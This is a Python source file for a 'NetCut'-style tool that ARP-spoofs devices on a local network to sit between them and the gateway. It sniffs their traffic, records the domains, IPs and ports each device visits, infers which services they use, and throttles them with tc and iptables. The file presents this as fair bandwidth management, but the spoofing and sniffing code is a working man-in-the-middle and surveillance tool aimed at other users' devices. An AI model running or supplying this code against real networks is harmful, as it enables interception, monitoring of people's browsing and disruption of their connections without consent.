#!/usr/bin/env python3
"""
NetCut Tool - Core Network Monitoring and Manipulation
Low-level bandwidth management, ARP spoofing, and traffic control
"""

import scapy.all as scapy
import os
import subprocess
import netifaces
import threading
import sys
import time
from collections import defaultdict, deque
from termcolor import colored
import statistics
import socket

# -------------------------
# Configuration
# -------------------------
class Config:
    # Monitoring interval (seconds)
    MONITOR_INTERVAL = 3
    
    # Traffic history length for ML analysis
    HISTORY_LENGTH = 20
    
    # Fairness thresholds
    MAX_SINGLE_DEVICE_PERCENT = 40  # Max % of total bandwidth per device
    MIN_GUARANTEED_KBPS = 256  # Minimum guaranteed speed per device
    
    # Auto-limit activation
    AUTO_LIMIT_ENABLED = True
    BANDWIDTH_ABUSE_THRESHOLD = 5000  # KB/s - if device exceeds, apply limits
    
    # Network capacity (auto-detect or manual)
    TOTAL_BANDWIDTH_KBPS = None  # None = auto-detect
    
    # Save state
    STATE_FILE = "/tmp/netcut_ai_state.json"

# -------------------------
# Utilities
# -------------------------
def has_root():
    return os.geteuid() == 0

def get_gateway_ip():
    try:
        return netifaces.gateways()["default"][netifaces.AF_INET][0]
    except Exception:
        print(colored("[!] Could not find default gateway.", "red"))
        sys.exit(1)

def get_default_interface():
    return netifaces.gateways()['default'][netifaces.AF_INET][1]

def get_subnet_cidr(iface):
    try:
        if_info = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
        addr, netmask = if_info['addr'], if_info['netmask']
        ip_parts = list(map(int, addr.split('.')))
        mask_parts = list(map(int, netmask.split('.')))
        net_addr_parts = [str(ip_parts[i] & mask_parts[i]) for i in range(4)]
        network_address = ".".join(net_addr_parts)
        prefix = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        return f"{network_address}/{prefix}"
    except Exception as e:
        print(colored(f"[!] Could not determine subnet. Error: {e}", "red"))
        sys.exit(1)

def enable_ip_forwarding():
    """Enable IP forwarding"""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
        print(colored("[✓] IP forwarding enabled", "green"))
    except:
        print(colored("[!] Failed to enable IP forwarding", "red"))

def discover_clients(ip_range):
    """Quick ARP scan"""
    found = {}
    try:
        answered, _ = scapy.arping(ip_range, timeout=2, verbose=False)
        for _, rcv in answered:
            found[rcv.psrc] = rcv.hwsrc
    except Exception as e:
        print(colored(f"[!] ARP scan failed: {e}", "red"))
    return [{"ip": ip, "mac": mac} for ip, mac in found.items()]

# -------------------------
# ARP Spoofing
# -------------------------
class ARPSpoofer:
    def __init__(self, target, gateway):
        self.target, self.gateway = target, gateway
        self.spoofing = threading.Event()

    def _spoof_loop(self):
        while not self.spoofing.is_set():
            # Send to target (tell target that gateway is at our MAC)
            pkt1 = scapy.Ether(dst=self.target["mac"]) / scapy.ARP(op=2, pdst=self.target["ip"], hwdst=self.target["mac"], psrc=self.gateway["ip"])
            scapy.sendp(pkt1, verbose=False)
            
            # Send to gateway (tell gateway that target is at our MAC)
            pkt2 = scapy.Ether(dst=self.gateway["mac"]) / scapy.ARP(op=2, pdst=self.gateway["ip"], hwdst=self.gateway["mac"], psrc=self.target["ip"])
            scapy.sendp(pkt2, verbose=False)
            
            time.sleep(0.5)

    def start(self):
        self.spoofing.clear()
        threading.Thread(target=self._spoof_loop, daemon=True).start()

    def stop(self):
        self.spoofing.set()
        time.sleep(0.5)
        # Restore ARP
        try:
            gw_mac = self.gateway.get('mac') or scapy.getmacbyip(self.gateway['ip'])
            t_mac = self.target.get('mac') or scapy.getmacbyip(self.target['ip'])
            
            if gw_mac and t_mac:
                for _ in range(5):  # Increased to 5 for better restoration
                    scapy.send(scapy.ARP(op=2, pdst=self.target['ip'], hwdst=t_mac, psrc=self.gateway['ip'], hwsrc=gw_mac), verbose=False)
                    scapy.send(scapy.ARP(op=2, pdst=self.gateway['ip'], hwdst=gw_mac, psrc=self.target['ip'], hwsrc=t_mac), verbose=False)
                    time.sleep(0.2)
            else:
                print(colored(f"[!] Could not restore ARP for {self.target['ip']}", "yellow"))
        except Exception as e:
            print(colored(f"[!] ARP restoration error: {e}", "red"))

# -------------------------
# Traffic Monitor (Packet Sniffing - More Accurate)
# -------------------------
class TrafficMonitor:
    def __init__(self, devices):
        self.devices = devices  # {ip: {"mac": ..., "name": ...}}
        self.stats = defaultdict(lambda: {"up": 0, "down": 0})
        self.history = defaultdict(lambda: deque(maxlen=Config.HISTORY_LENGTH))
        self.running = False
        self.lock = threading.Lock()
        self.byte_counters = defaultdict(lambda: {"up": 0, "down": 0})
        self.sniffer_thread = None

    def _packet_handler(self, packet):
        """Handle each captured packet"""
        try:
            if scapy.IP in packet:
                ip_src = packet[scapy.IP].src
                ip_dst = packet[scapy.IP].dst
                pkt_size = len(packet)
                
                with self.lock:
                    # Upload: packet FROM a monitored device
                    if ip_src in self.devices:
                        self.byte_counters[ip_src]["up"] += pkt_size
                    
                    # Download: packet TO a monitored device
                    if ip_dst in self.devices:
                        self.byte_counters[ip_dst]["down"] += pkt_size
        except Exception:
            pass

    def _sniffer_loop(self, iface):
        """Sniff packets on the interface"""
        try:
            # Sniff all IP packets
            scapy.sniff(
                iface=iface,
                prn=self._packet_handler,
                store=False,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            print(colored(f"[!] Sniffer error: {e}", "red"))

    def start(self):
        """Start monitoring"""
        self.running = True
        # Start packet sniffer in a separate thread
        iface = get_default_interface()
        self.sniffer_thread = threading.Thread(target=self._sniffer_loop, args=(iface,), daemon=True)
        self.sniffer_thread.start()
        print(colored(f"[+] Packet sniffer started on {iface}", "green"))
        # Start stats calculation thread
        threading.Thread(target=self._monitor_loop, daemon=True).start()

    def _monitor_loop(self):
        """Continuous monitoring loop to calculate speed"""
        last_bytes = defaultdict(lambda: {"up": 0, "down": 0})
        
        while self.running:
            time.sleep(Config.MONITOR_INTERVAL)
            
            with self.lock:
                for ip in self.devices.keys():
                    current_up = self.byte_counters[ip]["up"]
                    current_down = self.byte_counters[ip]["down"]
                    
                    # Calculate delta
                    delta_up = current_up - last_bytes[ip]["up"]
                    delta_down = current_down - last_bytes[ip]["down"]
                    
                    # Convert to KB/s (KiloBytes per second)
                    # Note: Most speed tests show Mbps (megabits/s), so KB/s * 8 / 1000 ≈ Mbps
                    up_kbps = (delta_up / 1024) / Config.MONITOR_INTERVAL
                    down_kbps = (delta_down / 1024) / Config.MONITOR_INTERVAL
                    
                    self.stats[ip] = {"up": up_kbps, "down": down_kbps}
                    self.history[ip].append({"up": up_kbps, "down": down_kbps, "time": time.time()})
                    
                    last_bytes[ip] = {"up": current_up, "down": current_down}

    def get_current_stats(self):
        """Get current bandwidth stats"""
        with self.lock:
            return dict(self.stats)

    def get_average_usage(self, ip, duration=60):
        """Get average usage over last N seconds"""
        with self.lock:
            history = list(self.history[ip])
            if not history:
                return {"up": 0, "down": 0}
            
            now = time.time()
            recent = [h for h in history if now - h["time"] <= duration]
            if not recent:
                return {"up": 0, "down": 0}
            
            avg_up = statistics.mean([h["up"] for h in recent])
            avg_down = statistics.mean([h["down"] for h in recent])
            return {"up": avg_up, "down": avg_down}

    def stop(self):
        """Stop monitoring"""
        self.running = False
        time.sleep(1)  # Allow monitor loop to finish
        print(colored("[+] Traffic monitor stopped", "green"))

# -------------------------
# Connection Tracker
# -------------------------
class ConnectionTracker:
    """Track active connections and DNS queries for each device"""
    
    def __init__(self, devices, iface):
        self.devices = devices
        self.iface = iface
        # Track with timestamps for recency
        self.connections = defaultdict(lambda: {
            "domains": deque(maxlen=50),  # (timestamp, domain)
            "ips": deque(maxlen=50),      # (timestamp, ip)
            "ports": defaultdict(int),
            "last_activity": 0
        })
        self.dns_cache = {}  # IP -> domain name cache
        self.running = threading.Event()
        self.lock = threading.Lock()
        
    def start(self):
        """Start packet sniffing"""
        self.running.clear()
        threading.Thread(target=self._sniff_packets, daemon=True).start()
        
    def _sniff_packets(self):
        """Sniff packets to track connections"""
        try:
            # Sniff all IP packets (no filter for better accuracy)
            scapy.sniff(
                iface=self.iface,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda x: self.running.is_set()
            )
        except Exception as e:
            print(colored(f"[!] Packet sniffing error: {e}", "yellow"))
    
    def _process_packet(self, pkt):
        """Process each captured packet"""
        try:
            # Check if packet has IP layer
            if not pkt.haslayer(scapy.IP):
                return
            
            src_ip = pkt[scapy.IP].src
            dst_ip = pkt[scapy.IP].dst
            
            # Only track packets from our monitored devices
            device_ip = None
            remote_ip = None
            
            if src_ip in self.devices:
                device_ip = src_ip
                remote_ip = dst_ip
            elif dst_ip in self.devices:
                device_ip = dst_ip
                remote_ip = src_ip
            else:
                return
            
            current_time = time.time()
            
            with self.lock:
                # Update last activity time
                self.connections[device_ip]["last_activity"] = current_time
                
                # Track DNS queries (outgoing)
                if pkt.haslayer(scapy.DNSQR):
                    try:
                        qname = pkt[scapy.DNSQR].qname
                        if qname:
                            domain = qname.decode('utf-8', errors='ignore').rstrip('.')
                            if domain and domain not in [d[1] for d in list(self.connections[device_ip]["domains"])[-10:]]:
                                self.connections[device_ip]["domains"].append((current_time, domain))
                    except:
                        pass
                
                # Track DNS responses to cache IP->domain mapping
                if pkt.haslayer(scapy.DNSRR):
                    try:
                        dns = pkt[scapy.DNS]
                        if dns.ancount > 0:
                            for i in range(dns.ancount):
                                answer = dns.an[i]
                                if answer.type == 1:  # A record
                                    domain = answer.rrname.decode('utf-8', errors='ignore').rstrip('.')
                                    ip_addr = answer.rdata
                                    if ip_addr:
                                        self.dns_cache[ip_addr] = domain
                    except:
                        pass
                
                # Track remote IPs (exclude local/broadcast)
                if remote_ip and remote_ip not in ['0.0.0.0', '255.255.255.255'] and not remote_ip.startswith('192.168.'):
                    # Check if this IP is not already in recent list
                    recent_ips = [ip[1] for ip in list(self.connections[device_ip]["ips"])[-10:]]
                    if remote_ip not in recent_ips:
                        self.connections[device_ip]["ips"].append((current_time, remote_ip))
                
                # Track ports and protocols
                if pkt.haslayer(scapy.TCP):
                    port = pkt[scapy.TCP].dport if src_ip == device_ip else pkt[scapy.TCP].sport
                    protocol = f"TCP/{port}"
                    self.connections[device_ip]["ports"][protocol] += 1
                elif pkt.haslayer(scapy.UDP):
                    port = pkt[scapy.UDP].dport if src_ip == device_ip else pkt[scapy.UDP].sport
                    if port != 53:  # Exclude DNS from port stats
                        protocol = f"UDP/{port}"
                        self.connections[device_ip]["ports"][protocol] += 1
                        
        except Exception as e:
            pass  # Silently ignore packet parsing errors
    
    def get_activity(self, ip):
        """Get connection activity for a device"""
        with self.lock:
            now = time.time()
            recent_window = 120  # Last 2 minutes
            
            # Filter recent domains (last 2 minutes)
            recent_domains = [(t, d) for t, d in self.connections[ip]["domains"] if now - t <= recent_window]
            domains_list = [d for _, d in recent_domains[-15:]]  # Last 15 recent domains
            
            # Filter recent IPs
            recent_ips_data = [(t, i) for t, i in self.connections[ip]["ips"] if now - t <= recent_window]
            ips_list = []
            for _, remote_ip in recent_ips_data[-15:]:
                if remote_ip in self.dns_cache:
                    ips_list.append(f"{remote_ip} ({self.dns_cache[remote_ip]})")
                else:
                    ips_list.append(remote_ip)
            
            # Get top 5 ports
            top_ports = []
            if self.connections[ip]["ports"]:
                sorted_ports = sorted(
                    self.connections[ip]["ports"].items(),
                    key=lambda x: x[1],
                    reverse=True
                )[:5]
                top_ports = [f"{port} ({count})" for port, count in sorted_ports]
            
            activity = {
                "domains": domains_list,
                "ips": ips_list,
                "top_ports": top_ports
            }
            
            return activity
    
    def get_summary(self, ip):
        """Get brief summary of current activity"""
        with self.lock:
            now = time.time()
            recent_window = 60  # Last 60 seconds for summary
            
            # Get recent domains only
            recent_domains = [(t, d) for t, d in self.connections[ip]["domains"] if now - t <= recent_window]
            
            if not recent_domains:
                # Check last activity time
                last_activity = self.connections[ip]["last_activity"]
                if last_activity == 0:
                    return "No activity"
                elif now - last_activity < 10:
                    return "Active (data transfer)"
                else:
                    return "Idle"
            
            # Identify services from recent domains
            domains = [d for _, d in recent_domains]
            services = []
            service_priority = {}  # Track service occurrences
            
            for domain in domains[-10:]:  # Last 10 domains
                domain_lower = domain.lower()
                
                # Check for known services
                if 'youtube' in domain_lower or 'googlevideo' in domain_lower or 'ytimg' in domain_lower:
                    service_priority['YouTube'] = service_priority.get('YouTube', 0) + 1
                elif 'netflix' in domain_lower or 'nflx' in domain_lower:
                    service_priority['Netflix'] = service_priority.get('Netflix', 0) + 1
                elif 'facebook' in domain_lower or 'fbcdn' in domain_lower or 'fbsbx' in domain_lower:
                    service_priority['Facebook'] = service_priority.get('Facebook', 0) + 1
                elif 'instagram' in domain_lower or 'cdninstagram' in domain_lower:
                    service_priority['Instagram'] = service_priority.get('Instagram', 0) + 1
                elif 'whatsapp' in domain_lower:
                    service_priority['WhatsApp'] = service_priority.get('WhatsApp', 0) + 1
                elif 'tiktok' in domain_lower or 'musical.ly' in domain_lower:
                    service_priority['TikTok'] = service_priority.get('TikTok', 0) + 1
                elif 'twitter' in domain_lower or 'twimg' in domain_lower or 'x.com' in domain_lower:
                    service_priority['Twitter/X'] = service_priority.get('Twitter/X', 0) + 1
                elif 'spotify' in domain_lower or 'scdn' in domain_lower:
                    service_priority['Spotify'] = service_priority.get('Spotify', 0) + 1
                elif 'twitch' in domain_lower:
                    service_priority['Twitch'] = service_priority.get('Twitch', 0) + 1
                elif 'amazon' in domain_lower or 'primevideo' in domain_lower:
                    service_priority['Amazon'] = service_priority.get('Amazon', 0) + 1
                elif 'google' in domain_lower and 'video' not in domain_lower:
                    service_priority['Google'] = service_priority.get('Google', 0) + 1
                elif 'discord' in domain_lower:
                    service_priority['Discord'] = service_priority.get('Discord', 0) + 1
                elif 'snapchat' in domain_lower:
                    service_priority['Snapchat'] = service_priority.get('Snapchat', 0) + 1
                elif 'reddit' in domain_lower:
                    service_priority['Reddit'] = service_priority.get('Reddit', 0) + 1
                elif 'cloudflare' in domain_lower or 'akamai' in domain_lower:
                    continue  # Skip CDN domains
                else:
                    # Extract main domain name
                    parts = domain.split('.')
                    if len(parts) >= 2:
                        main_domain = parts[-2].capitalize()
                        if len(main_domain) > 2:  # Skip short domains like 'co', 'tv'
                            service_priority[main_domain] = service_priority.get(main_domain, 0) + 1
            
            # Sort by priority (most frequent first)
            if service_priority:
                sorted_services = sorted(service_priority.items(), key=lambda x: x[1], reverse=True)
                top_services = [s[0] for s in sorted_services[:3]]
                return ', '.join(top_services)
            
            return f"Browsing ({len(domains)} sites)"
    
    def clear_history(self, ip):
        """Clear connection history for a device"""
        with self.lock:
            self.connections[ip] = {
                "domains": deque(maxlen=50),
                "ips": deque(maxlen=50),
                "ports": defaultdict(int),
                "last_activity": 0
            }
    
    def stop(self):
        """Stop tracking"""
        self.running.set()

# -------------------------
# Bandwidth Controller
# -------------------------
class BandwidthController:
    def __init__(self, iface, monitor):
        self.iface = iface
        self.monitor = monitor
        self.limits = {}  # {ip: {"down": kbps, "up": kbps}}
        self.spoofers = {}
        self.gateway = None
        self._setup_tc()

    def _setup_tc(self):
        """Initialize TC (traffic control)"""
        try:
            subprocess.run(f"tc qdisc del dev {self.iface} root 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            result = subprocess.run(f"tc qdisc add dev {self.iface} root handle 1: htb default 10", shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to setup TC qdisc: {result.stderr}", "red"))
                return False
            
            result = subprocess.run(f"tc class add dev {self.iface} parent 1: classid 1:10 htb rate 1000mbit", shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Failed to setup TC class: {result.stderr}", "red"))
                return False
            return True
        except Exception as e:
            print(colored(f"[!] TC setup failed: {e}", "red"))
            return False

    def set_gateway(self, gateway):
        """Set gateway for ARP spoofing"""
        self.gateway = gateway

    def start_spoofing(self, target):
        """Start ARP spoofing for a device"""
        if target["ip"] not in self.spoofers:
            spoofer = ARPSpoofer(target, self.gateway)
            self.spoofers[target["ip"]] = spoofer
            spoofer.start()

    def apply_limit(self, ip, down_kbps, up_kbps):
        """Apply bandwidth limit using TC"""
        # Validate input
        if down_kbps <= 0 or up_kbps <= 0:
            print(colored(f"[!] Invalid bandwidth values for {ip}", "red"))
            return False
        
        # Remove existing limit if present
        if ip in self.limits:
            self.remove_limit(ip)
        
        mark = str((hash(ip) % 200) + 50)
        
        # Calculate burst (at least 2KB or 1.5x rate for smoother traffic)
        burst_down = max(int(down_kbps * 1.5 / 8), 2000)
        burst_up = max(int(up_kbps * 1.5 / 8), 2000)
        
        try:
            # Upload limiting using TC (traffic FROM device)
            subprocess.run(f"tc class add dev {self.iface} parent 1: classid 1:{mark} htb rate {up_kbps}kbit burst {burst_up}b", shell=True, check=True, stderr=subprocess.PIPE)
            subprocess.run(f"tc qdisc add dev {self.iface} parent 1:{mark} handle {mark}: sfq perturb 10", shell=True, check=True, stderr=subprocess.PIPE)
            subprocess.run(f"tc filter add dev {self.iface} parent 1: protocol ip prio 1 u32 match ip src {ip} flowid 1:{mark}", shell=True, check=True, stderr=subprocess.PIPE)
            
            # Download limiting using TC (traffic TO device)
            # Use a different mark for download (mark + 200)
            mark_down = str(int(mark) + 200)
            subprocess.run(f"tc class add dev {self.iface} parent 1: classid 1:{mark_down} htb rate {down_kbps}kbit burst {burst_down}b", shell=True, check=True, stderr=subprocess.PIPE)
            subprocess.run(f"tc qdisc add dev {self.iface} parent 1:{mark_down} handle {mark_down}: sfq perturb 10", shell=True, check=True, stderr=subprocess.PIPE)
            subprocess.run(f"tc filter add dev {self.iface} parent 1: protocol ip prio 1 u32 match ip dst {ip} flowid 1:{mark_down}", shell=True, check=True, stderr=subprocess.PIPE)
            
            # Mark in iptables for additional control
            subprocess.run(f"iptables -t mangle -I POSTROUTING -s {ip} -j MARK --set-mark {mark}", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"iptables -t mangle -I PREROUTING -d {ip} -j MARK --set-mark {mark_down}", shell=True, stderr=subprocess.DEVNULL)
            
            self.limits[ip] = {"down": down_kbps, "up": up_kbps}
            print(colored(f"[✓] Limited {ip}: ↓{down_kbps}KB/s ↑{up_kbps}KB/s", "yellow"))
            return True
        except subprocess.CalledProcessError as e:
            print(colored(f"[!] Failed to apply limit to {ip}: {e}", "red"))
            # Cleanup partial rules
            self.remove_limit(ip)
            return False

    def remove_limit(self, ip):
        """Remove bandwidth limit"""
        if ip in self.limits:
            mark = str((hash(ip) % 200) + 50)
            mark_down = str(int(mark) + 200)
            
            # Delete upload rules (from device)
            subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"tc filter del dev {self.iface} parent 1: protocol ip prio 1 handle 800::{mark} u32 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            
            # Delete download rules (to device)
            subprocess.run(f"tc qdisc del dev {self.iface} parent 1:{mark_down} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"tc filter del dev {self.iface} parent 1: protocol ip prio 1 handle 800::{mark_down} u32 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark_down} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            
            # Remove iptables mangle rules
            subprocess.run(f"iptables -t mangle -D POSTROUTING -s {ip} -j MARK --set-mark {mark} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"iptables -t mangle -D PREROUTING -d {ip} -j MARK --set-mark {mark_down} 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            
            del self.limits[ip]
            print(colored(f"[✓] Removed limit for {ip}", "green"))

    def cleanup(self):
        """Cleanup all rules"""
        print(colored("[+] Cleaning up network rules...", "cyan"))
        
        # Stop ARP spoofers first
        for ip, spoofer in list(self.spoofers.items()):
            try:
                spoofer.stop()
                print(colored(f"  ✓ Stopped spoofing {ip}", "green"))
            except Exception as e:
                print(colored(f"  ! Error stopping spoofer for {ip}: {e}", "yellow"))
        
        # Remove all bandwidth limits
        for ip in list(self.limits.keys()):
            try:
                self.remove_limit(ip)
            except Exception as e:
                print(colored(f"  ! Error removing limit for {ip}: {e}", "yellow"))
        
        # Cleanup TC rules
        try:
            subprocess.run(f"tc qdisc del dev {self.iface} root 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            print(colored("  ✓ Removed TC rules", "green"))
        except Exception as e:
            print(colored(f"  ! TC cleanup warning: {e}", "yellow"))
        
        # Cleanup iptables mangle rules
        try:
            subprocess.run("iptables -t mangle -F POSTROUTING 2>/dev/null", shell=True, stderr=subprocess.DEVNULL)
            print(colored("  ✓ Flushed iptables mangle rules", "green"))
        except Exception as e:
            print(colored(f"  ! iptables cleanup warning: {e}", "yellow"))
        
        self.spoofers.clear()
        self.limits.clear()
